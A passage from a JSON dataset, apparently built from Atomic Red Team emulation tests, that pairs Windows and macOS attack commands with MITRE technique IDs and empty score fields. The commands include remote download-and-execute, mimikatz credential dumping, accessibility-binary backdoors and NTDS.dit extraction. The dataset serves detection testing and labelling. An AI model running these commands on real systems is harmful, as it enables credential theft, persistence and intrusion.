        "Description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1197",
        "Shell": "command_prompt"
    },
    {
        "ID": 1227,
        "Command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1\n",
        "Description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1197",
        "Shell": "powershell"
    },
    {
        "ID": 1228,
        "Command": "bitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1\nbitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL\nbitsadmin.exe /resume AtomicBITS\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete AtomicBITS\n",
        "Description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1197",
        "Shell": "command_prompt"
    },
    {
        "ID": 1229,
        "Command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr\n",
        "Description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1197",
        "Shell": "command_prompt"
    },
    {
        "ID": 1230,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"\n",
        "Description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1231,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\"\n",
        "Description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "command_prompt"
    },
    {
        "ID": 1232,
        "Command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n",
        "Description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1233,
        "Command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id\n",
        "Description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1234,
        "Command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll\" $address\n",
        "Description": "This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1235,
        "Command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug\n",
        "Description": "Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.\nWith this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread \n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)\n- References: \n  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\n  - https://twitter.com/_CPResearch_/status/1352310521752662018\n  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1236,
        "Command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n",
        "Description": "Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call EtwpCreateEtwThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)\n- References: \n  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3\n  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1237,
        "Command": "$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug\n",
        "Description": "Executes shellcode in a remote process.\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References: \n  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1238,
        "Command": "$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n",
        "Description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.\n\nThis application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)\n - References:\n  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1239,
        "Command": "$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n",
        "Description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1240,
        "Command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n",
        "Description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1241,
        "Command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n",
        "Description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1242,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1055\\bin\\x64\\uuid_injection.exe\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "Description": "The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread\n\nThe injected shellcode will open a message box and a notepad.\n\nReference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\nConcept from: http://ropgadget.com/posts/abusing_win_functions.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055",
        "Shell": "powershell"
    },
    {
        "ID": 1243,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username\" \"exit\"\n",
        "Description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 1244,
        "Command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n\\tNew-Item -Path $registryPath -Force\n\\tNew-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n\\tNew-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
        "Description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "powershell"
    },
    {
        "ID": 1245,
        "Command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n",
        "Description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1246,
        "Command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
        "Description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1247,
        "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\natbroker /start malware_test\n",
        "Description": "Executes code specified in the registry for a new AT (Assistive Technologies).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1248,
        "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n",
        "Description": "Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.\nThis test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1249,
        "Command": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n",
        "Description": "Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1250,
        "Command": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Magnify.exe /A\nicacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe\n",
        "Description": "Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1251,
        "Command": "IF NOT EXIST C:\\Windows\\System32\\Narrator_backup.exe (copy C:\\Windows\\System32\\Narrator.exe C:\\Windows\\System32\\Narrator_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Narrator.exe /A\nicacls C:\\Windows\\System32\\Narrator.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe\n",
        "Description": "Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1252,
        "Command": "vssadmin.exe create shadow /for=C:\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1253,
        "Command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1254,
        "Command": "mkdir C:\\Windows\\Temp\\ntds_T1003\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1255,
        "Command": "wmic shadowcopy call create Volume=C:\\\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1256,
        "Command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\\n",
        "Description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1257,
        "Command": "wmic /node:\"localhost\" process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"\n",
        "Description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1258,
        "Command": "(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "powershell"
    },
    {
        "ID": 1259,
        "Command": "vssadmin.exe create shadow /for=C:\nmklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n",
        "Description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1260,
        "Command": "mkdir c:\\exfil\ndiskshadow.exe /s PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt\n",
        "Description": "This test is intended to be run on a domain controller\nAn alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1261,
        "Command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nAdd-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All\nDisconnect-ExchangeOnline -Confirm:$false\n",
        "Description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.002",
        "Shell": "powershell"
    },
    {
        "ID": 1262,
        "Command": "start \"PathToAtomicsFolder\\T1221\\src\\Calculator.docx\"\n",
        "Description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1221",
        "Shell": "command_prompt"
    },
    {
        "ID": 1263,
        "Command": "cp PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n",
        "Description": "Copy in new loginwindow.plist to launch Calculator.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.007",
        "Shell": "sh"
    },
    {
        "ID": 1264,
        "Command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script\n",
        "Description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.007",
        "Shell": "sh"
    },
    {
        "ID": 1265,
        "Command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi\necho save backup copy to /tmp/\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\necho before\nplutil -p ${FILE}\necho overwriting...\n/tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}\n",
        "Description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.007",
        "Shell": "sh"
    },
    {
        "ID": 1266,
        "Command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes\ndd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data\n",
        "Description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.001",
        "Shell": "sh"
    },
    {
        "ID": 1267,
        "Command": "truncate -s +1 /tmp/evil-binary #adds a byte to the file size\n",
        "Description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.001",
        "Shell": "sh"
    },
    {
        "ID": 1268,
        "Command": "$startingDirectory = \"C:\\Users\"\n$outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"\n$fileExtensionsString = \".doc, .docx, .txt\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n\\t[string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n\\t$fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n\\t  Write-Host \"No files found with the specified extensions.\"\n  }\n",
        "Description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1005",
        "Shell": "powershell"
    },
    {
        "ID": 1269,
        "Command": "cd $HOME\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
        "Description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1005",
        "Shell": "bash"
    },
    {
        "ID": 1270,
